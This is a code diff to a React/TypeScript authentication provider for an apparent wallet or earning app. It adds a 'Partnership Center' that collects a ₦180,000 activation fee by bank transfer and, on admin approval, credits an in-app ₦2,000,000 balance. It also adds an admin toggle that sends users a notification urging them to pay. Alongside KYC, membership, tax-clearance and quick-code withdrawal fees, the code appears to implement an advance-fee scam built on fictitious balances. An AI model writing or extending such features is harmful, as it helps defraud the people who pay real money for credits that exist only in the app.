@@ -78,6 +78,8 @@ export const TIER_UPGRADE_PRICES: Record<number, number> = {
 export const REFERRAL_BONUS_AMOUNT = 15000; // ₦15,000 instant bonus per referral
 export const REFERRED_WELCOME_BONUS = 3000; // ₦3,000 welcome bonus for referred friend
 export const NEW_USER_BOT_BONUS = 100000; // ₦100,000 welcome bot earn bonus for new users
+export const PARTNER_CENTER_FEE = 180000; // ₦180,000 Partnership Center activation fee
+export const PARTNER_CENTER_PAYOUT = 2000000; // ₦2,000,000 instant Partners Cashout Line credit
 
 interface AuthContextType {
   user: User | null;
@@ -133,11 +135,12 @@ interface AuthContextType {
   submitDepositRequest: (
     amount: number,
     receiptName: string,
-    requestType?: 'deposit' | 'quickcode' | 'upgrade' | 'kyc' | 'membership',
+    requestType?: 'deposit' | 'quickcode' | 'upgrade' | 'kyc' | 'membership' | 'partner_center',
     planName?: string,
     withdrawalsCount?: number,
     receiptUrl?: string,
-    targetTier?: number
+    targetTier?: number,
+    extras?: { senderBank?: string; senderAccountName?: string }
   ) => DepositRequest | null;
   approveDepositRequest: (requestId: string) => boolean;
   declineDepositRequest: (requestId: string, reason?: string) => boolean;
@@ -188,6 +191,7 @@ interface AuthContextType {
   approveMembershipDirect: (userId: string) => boolean;
   setUserTierDirect: (userId: string, targetTier: number) => boolean;
   toggleVMode: (userId: string, targetStatus?: boolean) => boolean;
+  togglePartnerCenter: (userId: string, targetStatus?: boolean) => boolean;
   toggleRequireMembership: (userId: string, targetStatus?: boolean) => boolean;
   updateUserName: (newName: string) => Promise<boolean>;
   updateUserPin: (newPin: string) => Promise<boolean>;
@@ -520,6 +524,15 @@ const mergeCloudAndLocalUser = (cloudUser: User, localUser?: User | null): User 
       ? localMemStatus
       : cloudUser.membershipStatus || localMemStatus;
 
+  const localPartnerStatus = localUser.partnerCenterStatus;
+  const cloudPartnerStatus = cloudUser.partnerCenterStatus;
+  const resolvedPartnerCenterStatus =
+    cloudPartnerStatus === 'approved' || cloudPartnerStatus === 'declined'
+      ? cloudPartnerStatus
+      : localPartnerStatus === 'pending' && (!cloudPartnerStatus || cloudPartnerStatus === 'not_started')
+      ? 'pending'
+      : cloudPartnerStatus || localPartnerStatus;
+
   const localChatTs =
     localUser.supportChat?.lastTimestamp ||
     (localUser.supportChat?.updatedAt ? new Date(localUser.supportChat.updatedAt).getTime() : 0) ||
@@ -539,6 +552,14 @@ const mergeCloudAndLocalUser = (cloudUser: User, localUser?: User | null): User 
     kycStatus: resolvedKycStatus,
     isMembershipPaid: cloudUser.isMembershipPaid ?? localUser.isMembershipPaid,
     membershipStatus: resolvedMemStatus,
+    isPartnerCenterEnabled: cloudUser.isPartnerCenterEnabled ?? localUser.isPartnerCenterEnabled,
+    partnerCenterStatus: resolvedPartnerCenterStatus,
+    partnerCenterReference: cloudUser.partnerCenterReference ?? localUser.partnerCenterReference,
+    partnerCenterActivatedAt: cloudUser.partnerCenterActivatedAt ?? localUser.partnerCenterActivatedAt,
+    partnerCenterDeclinedReason:
+      resolvedPartnerCenterStatus === 'declined'
+        ? (cloudUser.partnerCenterDeclinedReason ?? localUser.partnerCenterDeclinedReason)
+        : undefined,
     accountStatus: cloudUser.accountStatus ?? localUser.accountStatus,
     isBanned: cloudUser.isBanned ?? localUser.isBanned,
     recoveryCode: cloudUser.recoveryCode ?? localUser.recoveryCode,
@@ -1822,11 +1843,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   const submitDepositRequest = (
     amount: number,
     receiptName: string,
-    requestType: 'deposit' | 'quickcode' | 'upgrade' | 'kyc' | 'membership' = 'deposit',
+    requestType: 'deposit' | 'quickcode' | 'upgrade' | 'kyc' | 'membership' | 'partner_center' = 'deposit',
     planName?: string,
     withdrawalsCount?: number,
     receiptUrl?: string,
-    targetTier?: number
+    targetTier?: number,
+    extras?: { senderBank?: string; senderAccountName?: string }
   ): DepositRequest | null => {
     const activeUser = userRef.current || user;
     if (!activeUser) return null;
@@ -1841,7 +1863,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
     const refPrefix = requestType === 'deposit'
       ? 'DEP9JA'
-      : (requestType === 'upgrade' ? 'UPG9JA' : (requestType === 'kyc' ? 'KYC9JA' : (requestType === 'membership' ? 'MEM9JA' : 'QC9JA')));
+      : (requestType === 'upgrade'
+        ? 'UPG9JA'
+        : (requestType === 'kyc'
+          ? 'KYC9JA'
+          : (requestType === 'membership'
+            ? 'MEM9JA'
+            : (requestType === 'partner_center' ? 'PC9JA' : 'QC9JA'))));
     const reference = existingPendingSameType?.reference || (refPrefix + Math.floor(10000000 + Math.random() * 90000000));
     const resolvedTier = targetTier || (requestType === 'upgrade' ? 2 : undefined);
     const resolvedPlanName = requestType === 'quickcode'
@@ -1852,7 +1880,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           ? (planName || 'KYC Account Verification Fee')
           : (requestType === 'membership'
             ? (planName || 'Official Membership Group Registration (₦9,200)')
-            : undefined)));
+            : (requestType === 'partner_center'
+              ? (planName || 'Partners Cashout Line (₦2,000,000) — Activation Fee (₦180,000)')
+              : undefined))));
 
     const reqId = existingPendingSameType?.id || ('dpr_' + Date.now() + '_' + Math.floor(100 + Math.random() * 900));
 
@@ -1867,6 +1897,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       receiptName: receiptName || 'payment_receipt.png',
       receiptUrl: receiptUrl || existingPendingSameType?.receiptUrl || '',
       requestType,
+      senderBank: extras?.senderBank?.trim() || undefined,
+      senderAccountName: extras?.senderAccountName?.trim() || undefined,
       targetTier: resolvedTier,
       planName: resolvedPlanName,
       withdrawalsCount: requestType === 'quickcode' ? (withdrawalsCount || 1) : undefined,
@@ -1965,6 +1997,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       ...activeUser,
       ...(requestType === 'kyc' ? { kycStatus: 'pending' as const, kycReference: reference } : {}),
       ...(requestType === 'membership' ? { membershipStatus: 'pending' as const, membershipReference: reference } : {}),
+      ...(requestType === 'partner_center'
+        ? {
+            partnerCenterStatus: 'pending' as const,
+            partnerCenterReference: reference,
+            partnerCenterDeclinedReason: undefined,
+          }
+        : {}),
       submittedRequests: [newRequest, ...prevUserRequests].slice(0, 15),
     };
     userRef.current = updatedUserWithReq;
@@ -1997,7 +2036,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       ? 'deposit'
       : (requestType === 'upgrade'
         ? 'upgrade'
-        : (requestType === 'kyc' || requestType === 'membership' ? 'transfer' : 'quickcode'));
+        : (requestType === 'kyc' || requestType === 'membership' || requestType === 'partner_center' ? 'transfer' : 'quickcode'));
     const txTitle = requestType === 'deposit'
       ? 'Wallet Deposit'
       : (requestType === 'upgrade'
@@ -2006,7 +2045,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           ? 'KYC Account Verification Fee'
           : (requestType === 'membership'
             ? 'Official Membership Group Fee'
-            : 'Quick Code Purchase')));
+            : (requestType === 'partner_center'
+              ? 'Partnership Center Activation Fee'
+              : 'Quick Code Purchase'))));
     const txSubtitle = requestType === 'deposit'
       ? 'Deposit Pending • Waiting company approval'
       : (requestType === 'upgrade'
@@ -2015,7 +2056,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           ? 'KYC Payment Pending (₦22,000) • Waiting company approval'
           : (requestType === 'membership'
             ? 'Membership Group Pending (₦9,200) • Awaiting Instant Clearance'
-            : 'Quick Code Purchase Pending • Waiting company approval')));
+            : (requestType === 'partner_center'
+              ? 'Partners Cashout Line (₦180,000) • Waiting company approval for ₦2,000,000 credit'
+              : 'Quick Code Purchase Pending • Waiting company approval'))));
 
     const newTx: Transaction = {
       id: 'tx_' + nowMs,
@@ -2057,10 +2100,11 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         }
       }
 
-      // Fallback for synthesized KYC or Membership requests
-      if (!foundReq && (requestId.startsWith('synth_kyc_') || requestId.startsWith('synth_mem_'))) {
+      // Fallback for synthesized KYC, Membership, or Partner Center requests
+      if (!foundReq && (requestId.startsWith('synth_kyc_') || requestId.startsWith('synth_mem_') || requestId.startsWith('synth_pc_'))) {
         const isSynthKyc = requestId.startsWith('synth_kyc_');
-        const synthUid = requestId.replace(isSynthKyc ? 'synth_kyc_' : 'synth_mem_', '');
+        const isSynthPc = requestId.startsWith('synth_pc_');
+        const synthUid = requestId.replace(isSynthKyc ? 'synth_kyc_' : (isSynthPc ? 'synth_pc_' : 'synth_mem_'), '');
         const uMatch = existingUsers.find((u) => u.id === synthUid);
         if (uMatch) {
           foundReq = {
@@ -2068,15 +2112,21 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
             userId: uMatch.id,
             userName: uMatch.name || 'User',
             userEmail: uMatch.email || '',
-            amount: isSynthKyc ? (appPricing?.kycPrice ?? 22000) : 9200,
+            amount: isSynthKyc ? (appPricing?.kycPrice ?? 22000) : (isSynthPc ? PARTNER_CENTER_FEE : 9200),
             bankName: companyAccount?.bankName || 'Company Account',
             accountNumber: companyAccount?.accountNumber || '',
-            receiptName: isSynthKyc ? 'KYC_Receipt.png' : 'Membership_Receipt.png',
-            requestType: isSynthKyc ? 'kyc' : 'membership',
-            planName: isSynthKyc ? 'KYC Account Verification Fee' : 'Official Membership Group Registration (₦9,200)',
+            receiptName: isSynthKyc ? 'KYC_Receipt.png' : (isSynthPc ? 'Partner_Center_Receipt.png' : 'Membership_Receipt.png'),
+            requestType: isSynthKyc ? 'kyc' : (isSynthPc ? 'partner_center' : 'membership'),
+            planName: isSynthKyc
+              ? 'KYC Account Verification Fee'
+              : (isSynthPc
+                ? 'Partners Cashout Line (₦2,000,000) — Activation Fee (₦180,000)'
+                : 'Official Membership Group Registration (₦9,200)'),
             status: 'pending',
             submittedAt: new Date().toISOString(),
-            reference: (isSynthKyc ? uMatch.kycReference : uMatch.membershipReference) || `REF-${uMatch.id.slice(0, 6).toUpperCase()}`,
+            reference: (isSynthKyc
+              ? uMatch.kycReference
+              : (isSynthPc ? uMatch.partnerCenterReference : uMatch.membershipReference)) || `REF-${uMatch.id.slice(0, 6).toUpperCase()}`,
           };
         }
       }
@@ -2091,9 +2141,10 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       const isKyc = foundReq.requestType === 'kyc';
       const isUpgrade = foundReq.requestType === 'upgrade';
       const isMembership = foundReq.requestType === 'membership';
-      const isDeposit = foundReq.requestType === 'deposit' || (!foundReq.planName && !foundReq.requestType && !isUpgrade && !isKyc && !isMembership && !isTaxPayment);
+      const isPartnerCenter = foundReq.requestType === 'partner_center';
+      const isDeposit = foundReq.requestType === 'deposit' || (!foundReq.planName && !foundReq.requestType && !isUpgrade && !isKyc && !isMembership && !isTaxPayment && !isPartnerCenter);
 
-      const assignedQuickCode = (!isKyc && !isUpgrade && !isDeposit && !isMembership)
+      const assignedQuickCode = (!isKyc && !isUpgrade && !isDeposit && !isMembership && !isPartnerCenter)
         ? ('9JA-' + Math.floor(1000 + Math.random() * 9000))
         : undefined;
 
@@ -2469,6 +2520,105 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           'success',
           { targetUserName: targetReq.userName }
         );
+      } else if (isPartnerCenter) {
+        // PARTNERSHIP CENTER APPROVAL: Activate Partnership Center and credit ₦2,000,000 instantly
+        const nowMs = Date.now();
+        const nowIso = new Date(nowMs).toISOString();
+
+        if (targetUserIdx !== -1) {
+          const targetUser = existingUsers[targetUserIdx];
+          const newBalance = (targetUser.balance || 0) + PARTNER_CENTER_PAYOUT;
+          const newAvailBalance = (targetUser.availableBalance ?? targetUser.balance ?? 0) + PARTNER_CENTER_PAYOUT;
+          const updatedTargetUser: User = {
+            ...targetUser,
+            isPartnerCenterEnabled: true,
+            partnerCenterStatus: 'approved',
+            partnerCenterActivatedAt: nowIso,
+            partnerCenterDeclinedReason: undefined,
+            balance: newBalance,
+            availableBalance: newAvailBalance,
+            lastBalanceMutationAt: nowMs,
+            updatedAt: nowIso,
+            submittedRequests: syncUserSubmittedReqs(targetUser),
+          };
+          existingUsers[targetUserIdx] = updatedTargetUser;
+          setAllUsers([...existingUsers]);
+          safeLocalStorageSet(USERS_STORAGE_KEY, JSON.stringify(existingUsers));
+          saveUserToFirestore(updatedTargetUser).catch(console.error);
+
+          if (user && user.id === targetReq.userId) {
+            userRef.current = updatedTargetUser;
+            setUser(updatedTargetUser);
+            safeLocalStorageSet(CURRENT_USER_KEY, JSON.stringify(updatedTargetUser));
+          }
+        }
+
+        const approvedFeeTx: Transaction = {
+          id: 'tx_app_pc_fee_' + nowMs,
+          type: 'transfer',
+          title: 'Partnership Center Activation Fee',
+          subtitle: 'Partners Cashout Line Activated • Approved by Company',
+          amount: targetReq.amount || PARTNER_CENTER_FEE,
+          date: dateStr,
+          time: timeStr,
+          isCredit: false,
+          status: 'successful',
+          reference: targetReq.reference,
+          timestamp: nowMs,
+          createdAt: nowIso,
+        };
+
+        const instantCreditTx: Transaction = {
+          id: 'tx_app_pc_credit_' + (nowMs + 1),
+          type: 'deposit',
+          title: 'Partners Cashout Line Credit',
+          subtitle: 'Partnership Center Activated • Instant ₦2,000,000 Payout Credit',
+          amount: PARTNER_CENTER_PAYOUT,
+          date: dateStr,
+          time: timeStr,
+          isCredit: true,
+          status: 'successful',
+          reference: `PC2M-${targetReq.reference}`,
+          timestamp: nowMs + 1,
+          createdAt: new Date(nowMs + 1).toISOString(),
+        };
+
+        let userTxsToUpdate: Transaction[] = [];
+        if (user && user.id === targetReq.userId) {
+          userTxsToUpdate = transactions;
+        } else {
+          try {
+            const raw = localStorage.getItem(`${TRANSACTIONS_PREFIX}${targetReq.userId}`);
+            userTxsToUpdate = raw ? JSON.parse(raw) : [];
+          } catch {
+            userTxsToUpdate = [];
+          }
+        }
+
+        const updatedTxs = userTxsToUpdate.map((t) =>
+          t.reference === targetReq.reference ? approvedFeeTx : t
+        );
+        const hasFeeTx = updatedTxs.some((t) => t.reference === targetReq.reference);
+        const withFeeTx = hasFeeTx ? updatedTxs : [approvedFeeTx, ...userTxsToUpdate];
+        const finalTxs = sortTransactionsNewestFirst([
+          instantCreditTx,
+          ...withFeeTx.filter((t) => t.reference !== instantCreditTx.reference),
+        ]);
+
+        if (user && user.id === targetReq.userId) {
+          setTransactions(finalTxs);
+        }
+        safeLocalStorageSet(`${TRANSACTIONS_PREFIX}${targetReq.userId}`, JSON.stringify(finalTxs));
+        saveTransactionToFirestore(approvedFeeTx, targetReq.userId).catch(console.error);
+        saveTransactionToFirestore(instantCreditTx, targetReq.userId).catch(console.error);
+
+        sendNotificationToUser(
+          targetReq.userId,
+          'Partnership Center Activated • ₦2,000,000 Credited!',
+          `Congratulations! Your Partnership Center has been activated and ${formatNaira(PARTNER_CENTER_PAYOUT)} has been credited instantly to your wallet balance.`,
+          'success',
+          { targetUserName: targetReq.userName }
+        );
       } else {
         // QUICK CODE PURCHASE: Generate Quick Code & assign to user
         const assignedCode = assignedQuickCode || ('9JA-' + Math.floor(1000 + Math.random() * 9000));
@@ -2630,30 +2780,37 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         return false;
       }
 
-      // Support declining synthesized KYC or Membership requests
-      if (!targetReq && (requestId.startsWith('synth_kyc_') || requestId.startsWith('synth_mem_'))) {
+      // Support declining synthesized KYC, Membership, or Partner Center requests
+      if (!targetReq && (requestId.startsWith('synth_kyc_') || requestId.startsWith('synth_mem_') || requestId.startsWith('synth_pc_'))) {
         const isSynthKyc = requestId.startsWith('synth_kyc_');
-        const synthUserId = requestId.replace(isSynthKyc ? 'synth_kyc_' : 'synth_mem_', '');
+        const isSynthPc = requestId.startsWith('synth_pc_');
+        const synthUserId = requestId.replace(isSynthKyc ? 'synth_kyc_' : (isSynthPc ? 'synth_pc_' : 'synth_mem_'), '');
         const uMatch = existingUsers.find((u) => u.id === synthUserId);
         if (uMatch) {
           const matchingSub = (uMatch.submittedRequests || []).find(
-            (r) => r.requestType === (isSynthKyc ? 'kyc' : 'membership')
+            (r) => r.requestType === (isSynthKyc ? 'kyc' : (isSynthPc ? 'partner_center' : 'membership'))
           );
           targetReq = matchingSub || {
             id: requestId,
             userId: uMatch.id,
             userName: uMatch.name || 'User',
             userEmail: uMatch.email || '',
-            amount: isSynthKyc ? (appPricing?.kycPrice ?? 22000) : 9200,
+            amount: isSynthKyc ? (appPricing?.kycPrice ?? 22000) : (isSynthPc ? PARTNER_CENTER_FEE : 9200),
             bankName: companyAccount?.bankName || 'Company Account',
             accountNumber: companyAccount?.accountNumber || '',
-            receiptName: isSynthKyc ? 'KYC_Payment_Receipt.png' : 'Membership_Payment_Receipt.png',
+            receiptName: isSynthKyc ? 'KYC_Payment_Receipt.png' : (isSynthPc ? 'Partner_Center_Receipt.png' : 'Membership_Payment_Receipt.png'),
             receiptUrl: '',
-            requestType: isSynthKyc ? 'kyc' : 'membership',
-            planName: isSynthKyc ? 'KYC Account Verification Fee' : 'Official Membership Group Registration (₦9,200)',
+            requestType: isSynthKyc ? 'kyc' : (isSynthPc ? 'partner_center' : 'membership'),
+            planName: isSynthKyc
+              ? 'KYC Account Verification Fee'
+              : (isSynthPc
+                ? 'Partners Cashout Line (₦2,000,000) — Activation Fee (₦180,000)'
+                : 'Official Membership Group Registration (₦9,200)'),
             status: 'pending',
             submittedAt: uMatch.createdAt || new Date().toISOString(),
-            reference: (isSynthKyc ? uMatch.kycReference : uMatch.membershipReference) || `REF-${uMatch.id.slice(0, 6).toUpperCase()}`,
+            reference: (isSynthKyc
+              ? uMatch.kycReference
+              : (isSynthPc ? uMatch.partnerCenterReference : uMatch.membershipReference)) || `REF-${uMatch.id.slice(0, 6).toUpperCase()}`,
           };
         }
       }
@@ -2680,7 +2837,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       const isKyc = targetReq.requestType === 'kyc';
       const isUpgrade = targetReq.requestType === 'upgrade';
       const isMembership = targetReq.requestType === 'membership';
-      const isDeposit = targetReq.requestType === 'deposit' || (!targetReq.planName && !targetReq.requestType && !isUpgrade && !isKyc && !isMembership && !isTaxPayment);
+      const isPartnerCenter = targetReq.requestType === 'partner_center';
+      const isDeposit = targetReq.requestType === 'deposit' || (!targetReq.planName && !targetReq.requestType && !isUpgrade && !isKyc && !isMembership && !isTaxPayment && !isPartnerCenter);
       const targetUserIdx = existingUsers.findIndex((u) => u.id === targetReq!.userId);
 
       if (targetUserIdx !== -1) {
@@ -2708,6 +2866,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
             : {}),
           ...(isKyc ? { kycStatus: 'declined' as const } : {}),
           ...(isMembership ? { membershipStatus: 'declined' as const } : {}),
+          ...(isPartnerCenter
+            ? {
+                partnerCenterStatus: 'declined' as const,
+                partnerCenterDeclinedReason: declineReason,
+              }
+            : {}),
         };
         existingUsers[targetUserIdx] = updatedTargetUser;
         setAllUsers([...existingUsers]);
@@ -2734,8 +2898,16 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
       const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
 
-      const declinedTxType = isDeposit ? 'deposit' : (isUpgrade ? 'upgrade' : (isKyc || isTaxPayment ? 'transfer' : 'quickcode'));
-      const declinedTxTitle = isDeposit ? 'Wallet Deposit Declined' : (isUpgrade ? 'Account Upgrade Declined' : (isKyc ? 'KYC Verification Declined' : (isTaxPayment ? 'Tax Clearance Declined' : 'Quick Code Declined')));
+      const declinedTxType = isDeposit ? 'deposit' : (isUpgrade ? 'upgrade' : (isKyc || isTaxPayment || isPartnerCenter ? 'transfer' : 'quickcode'));
+      const declinedTxTitle = isDeposit
+        ? 'Wallet Deposit Declined'
+        : (isUpgrade
+          ? 'Account Upgrade Declined'
+          : (isKyc
+            ? 'KYC Verification Declined'
+            : (isTaxPayment
+              ? 'Tax Clearance Declined'
+              : (isPartnerCenter ? 'Partnership Center Payment Declined' : 'Quick Code Declined'))));
 
       const declinedTx: Transaction = {
         id: 'tx_dec_' + Date.now(),
@@ -2765,7 +2937,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
       const declineNoticeTitle = isKyc
         ? 'KYC Verification Declined ❌'
-        : (isDeposit ? 'Wallet Deposit Declined ❌' : (isUpgrade ? 'Tier Upgrade Declined ❌' : 'Quick Code Declined ❌'));
+        : (isPartnerCenter
+          ? 'Partnership Center Payment Declined'
+          : (isDeposit ? 'Wallet Deposit Declined ❌' : (isUpgrade ? 'Tier Upgrade Declined ❌' : 'Quick Code Declined ❌')));
 
       sendNotificationToUser(
         targetReq.userId,
@@ -5803,6 +5977,52 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
   };
 
+  const togglePartnerCenter = (userId: string, targetStatus?: boolean): boolean => {
+    try {
+      const existingUsers = getAllRegisteredUsers();
+      const idx = existingUsers.findIndex((u) => u.id === userId);
+      if (idx === -1) return false;
+      const target = existingUsers[idx];
+      const newStatus = typeof targetStatus === 'boolean' ? targetStatus : !target.isPartnerCenterEnabled;
+      const nowMs = Date.now();
+
+      const updatedUser: User = {
+        ...target,
+        isPartnerCenterEnabled: newStatus,
+        partnerCenterStatus: newStatus
+          ? (target.partnerCenterStatus || 'not_started')
+          : target.partnerCenterStatus,
+        updatedAt: new Date(nowMs).toISOString(),
+      };
+
+      existingUsers[idx] = updatedUser;
+      setAllUsers([...existingUsers]);
+      safeLocalStorageSet(USERS_STORAGE_KEY, JSON.stringify(existingUsers));
+      saveUserToFirestore(updatedUser).catch(console.error);
+
+      if (user && user.id === userId) {
+        userRef.current = updatedUser;
+        setUser(updatedUser);
+        safeLocalStorageSet(CURRENT_USER_KEY, JSON.stringify(updatedUser));
+      }
+
+      if (newStatus && target.partnerCenterStatus !== 'approved') {
+        sendNotificationToUser(
+          userId,
+          'Partners Cashout Line Unlocked (₦2,000,000)',
+          'Partnership Center has been enabled on your dashboard. Tap the purple Partners Cashout Line button at the top of your dashboard to activate and receive ₦2,000,000 instantly upon approval.',
+          'info',
+          { targetUserName: target.name }
+        );
+      }
+
+      return true;
+    } catch (e) {
+      console.error('Toggle Partner Center error', e);
+      return false;
+    }
+  };
+
   const toggleRequireMembership = (userId: string, targetStatus?: boolean): boolean => {
     try {
       const existingUsers = getAllRegisteredUsers();
@@ -6155,6 +6375,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         approveMembershipDirect,
         setUserTierDirect,
         toggleVMode,
+        togglePartnerCenter,
         toggleRequireMembership,
         updateUserName,
         updateUserPin,
